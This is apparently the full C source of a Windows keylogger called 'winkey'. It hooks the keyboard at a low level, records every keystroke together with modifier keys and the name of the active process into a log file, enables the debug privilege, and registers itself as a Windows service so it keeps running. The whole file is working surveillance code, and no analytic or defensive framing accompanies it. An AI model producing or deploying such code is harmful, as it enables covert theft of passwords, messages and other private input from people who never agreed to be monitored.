#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0A00  // Define Windows 10 or Windows 11

#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <psapi.h>
#include <time.h>
#include <wtsapi32.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "User32.lib")

#define INI_FILE_NAME L"winkey.ini"
#define DEFAULT_LOG_FILE L"winkey.log"
#define ERROR_LOG_FILE L"winkeyerror.log"
#define STARTUP_LOG_FILE L"winkeystartup.log"
#define MAX_PATH_LEN 260
#define SERVICE_NAME L"winkeyService"

// Global variables for service control
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE hServiceStopEvent = NULL;

wchar_t lastProcessName[MAX_PATH_LEN] = L"";
HWND lastForegroundWindow = NULL;

// Forward declarations
void logError(const wchar_t* format, ...);
void logStartup(const wchar_t* format, ...);
int loadConfiguration(wchar_t* logPath, size_t max_size);
void elevatePrivileges();
void logProcessName(FILE* file);
void logSpecialKey(int key, FILE* file);
void logPrintableKey(int key, FILE* file);
void logModifiers(FILE* file);
void logKeystroke(int key, const wchar_t* logPath);
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam);
void StartKeyloggerInUserSession();
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv);
void WINAPI ControlHandler(DWORD request);
void StartKeyloggerAsService();
void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);
void KeepServiceActive();  // New function to avoid suspension

// Function to log errors to a file
void logError(const wchar_t* format, ...) {
    FILE* file = _wfopen(ERROR_LOG_FILE, L"a+");
    if (file == NULL) {
        return;
    }

    time_t now = time(NULL);
    struct tm* localTime = localtime(&now);
    fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
             localTime->tm_year + 1900,
             localTime->tm_mon + 1,
             localTime->tm_mday,
             localTime->tm_hour,
             localTime->tm_min,
             localTime->tm_sec);

    va_list args;
    va_start(args, format);
    vfwprintf(file, format, args);
    va_end(args);

    fclose(file);
}

// Function to log the startup steps to a separate file
void logStartup(const wchar_t* format, ...) {
    // Get executable path
    wchar_t logFilePath[MAX_PATH_LEN];
    GetModuleFileNameW(NULL, logFilePath, MAX_PATH_LEN);
    wchar_t* lastBackslash = wcsrchr(logFilePath, L'\\');
    if (lastBackslash) {
        *(lastBackslash + 1) = L'\0';  // Truncate after the last backslash
        wcscat(logFilePath, L"winkeystartup.log");
    }

    FILE* file = _wfopen(logFilePath, L"a+");
    if (file == NULL) {
        return;
    }

    time_t now = time(NULL);
    struct tm* localTime = localtime(&now);
    fwprintf(file, L"[%04d-%02d-%02d %02d:%02d:%02d] ",
             localTime->tm_year + 1900,
             localTime->tm_mon + 1,
             localTime->tm_mday,
             localTime->tm_hour,
             localTime->tm_min,
             localTime->tm_sec);

    va_list args;
    va_start(args, format);
    vfwprintf(file, format, args);
    va_end(args);

    fclose(file);
}

// Load the configuration from an INI file
int loadConfiguration(wchar_t* logPath, size_t max_size) {
    wchar_t iniFilePath[MAX_PATH_LEN];
    DWORD length = GetModuleFileNameW(NULL, iniFilePath, MAX_PATH_LEN);
    if (length == 0 || length == MAX_PATH_LEN) {
        logError(L"Error getting executable path. Error: %lu\n", GetLastError());
        return 0;
    }

    wchar_t* lastBackslash = wcsrchr(iniFilePath, L'\\');
    if (lastBackslash != NULL) {
        *(lastBackslash + 1) = L'\0';
        wcscat_s(iniFilePath, MAX_PATH_LEN, INI_FILE_NAME);
    } else {
        logError(L"Error formatting INI file path.\n");
        return 0;
    }

    FILE* iniFile = _wfopen(iniFilePath, L"r");
    if (iniFile == NULL) {
        logError(L"INI file does not exist or cannot be opened: %ls\n", iniFilePath);
        return 0;
    }
    fclose(iniFile);

    DWORD charsRead = GetPrivateProfileStringW(L"Settings", L"Path", NULL, logPath, (DWORD)max_size, iniFilePath);
    if (charsRead == 0) {
        logError(L"Error reading 'Path' from INI. Error: %lu\n", GetLastError());
        return 0;
    }
    return 1;
}

// Function to elevate privileges
void elevatePrivileges() {
    logStartup(L"Elevating privileges...");
    
    HANDLE hToken;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tokenPrivileges.Privileges[0].Luid);
        tokenPrivileges.PrivilegeCount = 1;
        tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        CloseHandle(hToken);
        logStartup(L"Privileges elevated successfully.");
    } else {
        logError(L"Failed to elevate privileges. Error: %lu\n", GetLastError());
    }
}

// Function to log the process name when it changes
void logProcessName(FILE* file) {
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow == NULL) {
        fwprintf(file, L"[Unknown Process]");
        return;
    }

    if (foregroundWindow != lastForegroundWindow) {
        lastForegroundWindow = foregroundWindow;

        DWORD processId;
        GetWindowThreadProcessId(foregroundWindow, &processId);

        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
        }
        if (processHandle == NULL) {
            processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
        }

        wchar_t processName[MAX_PATH_LEN] = L"Unknown Process";
        if (processHandle != NULL) {
            if (GetModuleBaseNameW(processHandle, NULL, processName, MAX_PATH_LEN) == 0) {
                if (GetProcessImageFileNameW(processHandle, processName, MAX_PATH_LEN) == 0) {
                    wcscpy_s(processName, MAX_PATH_LEN, L"Unknown Process");
                }
            }
            CloseHandle(processHandle);
        }

        if (wcscmp(lastProcessName, processName) != 0) {
            wcscpy_s(lastProcessName, MAX_PATH_LEN, processName);

            time_t now = time(NULL);
            struct tm* localTime = localtime(&now);
            fwprintf(file, L"\n[%04d-%02d-%02d %02d:%02d:%02d] [%ls]\n",
                     localTime->tm_year + 1900,
                     localTime->tm_mon + 1,
                     localTime->tm_mday,
                     localTime->tm_hour,
                     localTime->tm_min,
                     localTime->tm_sec,
                     processName);
        }
    }
}

// Hook function to capture keystrokes
LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        int key = kbdStruct->vkCode;
        wchar_t logPath[MAX_PATH_LEN];
        if (!loadConfiguration(logPath, MAX_PATH_LEN)) {
            wcscpy_s(logPath, MAX_PATH_LEN, DEFAULT_LOG_FILE);
            logError(L"Could not load configuration. Using default log file: %ls\n", logPath);
        }
        logKeystroke(key, logPath);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// Function to log printable keys
void logPrintableKey(int key, FILE* file) {
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);

    WCHAR buffer[16];
    int result = ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0, GetKeyboardLayout(0));

    if (result > 0) {
        buffer[result] = L'\0';  // Ensure null-termination
        fwprintf(file, L"%ls", buffer);
    } else {
        logSpecialKey(key, file);  // Log as special key if not printable
    }
}

// Function to log special keys
void logSpecialKey(int key, FILE* file) {
    switch (key) {
        case VK_RETURN: fwprintf(file, L"[ENTER]"); break;
        case VK_BACK: fwprintf(file, L"[BACKSPACE]"); break;
        case VK_TAB: fwprintf(file, L"[TAB]"); break;
        case VK_ESCAPE: fwprintf(file, L"[ESC]"); break;
        case VK_SPACE: fwprintf(file, L" "); break;
        case VK_SHIFT: fwprintf(file, L"[SHIFT]"); break;
        case VK_CONTROL: fwprintf(file, L"[CTRL]"); break;
        case VK_MENU: fwprintf(file, L"[ALT]"); break;
        case VK_LWIN: case VK_RWIN: fwprintf(file, L"[WIN]"); break;
        case VK_CAPITAL: fwprintf(file, L"[CAPS LOCK]"); break;
        case VK_DELETE: fwprintf(file, L"[DELETE]"); break;
        case VK_HOME: fwprintf(file, L"[HOME]"); break;
        case VK_END: fwprintf(file, L"[END]"); break;
        case VK_PRIOR: fwprintf(file, L"[PAGE UP]"); break;
        case VK_NEXT: fwprintf(file, L"[PAGE DOWN]"); break;
        default: {
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            WCHAR buffer[16];
            int result = ToUnicodeEx(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 16, 0, GetKeyboardLayout(0));

            if (result > 0) {
                buffer[result] = L'\0';  // Null-terminate the string
                fwprintf(file, L"%ls", buffer);
            }
        }
    }
}

// Function to log key events
void logKeystroke(int key, const wchar_t* logPath) {
    FILE* file = _wfopen(logPath, L"a+");
    if (file == NULL) {
        logError(L"Error opening log file: %ls\n", logPath);
        return;
    }

    logProcessName(file);
    logModifiers(file);

    if ((key >= 0x30 && key <= 0x5A) || (key >= 0x60 && key <= 0x7A)) {
        logPrintableKey(key, file);
    } else {
        logSpecialKey(key, file);
    }

    fclose(file);
}

// Function to log modifiers
void logModifiers(FILE* file) {
    if (GetKeyState(VK_SHIFT) & 0x8000) {
        fwprintf(file, L"[SHIFT]");
    }
    if (GetKeyState(VK_CONTROL) & 0x8000) {
        fwprintf(file, L"[CTRL]");
    }
    if (GetKeyState(VK_MENU) & 0x8000) {
        fwprintf(file, L"[ALT]");
    }
    if (GetKeyState(VK_LWIN) & 0x8000 || GetKeyState(VK_RWIN) & 0x8000) {
        fwprintf(file, L"[WIN]");
    }
}

// Function to start the keylogger in the user session
void StartKeyloggerInUserSession() {
    logStartup(L"Starting keylogger in user session.");

    // Hook the keyboard in user session
    HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
    if (hook == NULL) {
        logError(L"Error setting up keyboard hook. Error: %lu\n", GetLastError());
    }

    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnhookWindowsHookEx(hook);
}

// Function to keep service alive and prevent suspension
void KeepServiceActive() {
    logStartup(L"Starting keep-alive loop.");
    
    while (WaitForSingleObject(hServiceStopEvent, 5000) != WAIT_OBJECT_0) {
        logStartup(L"Service is running... still active.");
    }

    logStartup(L"Keep-alive loop has ended.");
}

// Service control handler function
void WINAPI ControlHandler(DWORD request) {
    switch (request) {
        case SERVICE_CONTROL_STOP:
            logStartup(L"Service is stopping...");
            ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
            SetEvent(hServiceStopEvent);
            ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
            return;
        default:
            break;
    }
}

// Function to report service status
void ReportServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    ServiceStatus.dwCurrentState = dwCurrentState;
    ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    ServiceStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING) {
        ServiceStatus.dwControlsAccepted = 0;
    } else {
        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

// Service main function
void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
    (void)argc;
    (void)argv;
    
    logStartup(L"ServiceMain started.");

    hStatus = RegisterServiceCtrlHandlerW(SERVICE_NAME, ControlHandler);
    if (hStatus == NULL) {
        logError(L"Failed to register service control handler. Error: %lu\n", GetLastError());
        return;
    }

    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

    hServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hServiceStopEvent == NULL) {
        ReportServiceStatus(SERVICE_STOPPED, GetLastError(), 0);
        logError(L"Failed to create stop event.");
        return;
    }

    logStartup(L"Service is now running.");
    ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

    elevatePrivileges();
    StartKeyloggerInUserSession();  // Start capturing keystrokes
    KeepServiceActive();

    logStartup(L"Service is stopping.");
    ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

// Main entry point
int wmain(int argc, wchar_t* argv[]) {
    if (argc > 1 && wcscmp(argv[1], L"run") == 0) {
        StartKeyloggerInUserSession();
        return 0;
    }

    logStartup(L"Attempting to start the service...");

    SERVICE_TABLE_ENTRYW ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcherW(ServiceTable)) {
        logError(L"Service failed to start. Error: %lu\n", GetLastError());
    }

    logStartup(L"Exiting main function.");
    return 0;
}
